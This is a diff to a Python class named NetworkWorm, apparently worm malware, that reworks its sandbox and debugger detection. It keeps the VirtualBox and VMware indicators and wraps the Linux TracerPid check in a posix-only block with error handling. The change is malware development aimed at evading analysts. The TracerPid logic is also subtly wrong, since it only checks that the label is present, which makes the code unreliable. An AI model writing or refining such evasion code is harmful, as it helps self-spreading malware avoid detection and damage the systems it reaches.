@@ -296,9 +296,21 @@ class NetworkWorm:
         # Check for common analysis environments
         analysis_indicators = [
             "vbox" in sys.modules,
-            "vmware" in (os.getenv('VBOX_INSTALL_PATH', '') + os.getenv('VMWARE_ROOT', '')).lower(),
-            Path("/proc/self/status").read_text().count("TracerPid:") > 0
+            "vmware" in (os.getenv('VBOX_INSTALL_PATH', '') + os.getenv('VMWARE_ROOT', '')).lower()
         ]
+
+        # Linux-specific checks with error handling
+        if os.name == 'posix':
+            try:
+                status = Path("/proc/self/status").read_text(encoding='utf-8')
+                analysis_indicators.append(status.count("TracerPid:") > 0)
+            except FileNotFoundError:
+                # Handle Windows Subsystem for Linux (WSL) edge cases
+                analysis_indicators.append(False)
+            except Exception as e:
+                logging.error(f"Analysis detection error: {str(e)}")
+                analysis_indicators.append(False)
+
         return any(analysis_indicators)
 
     def _kill_previous_instances(self):
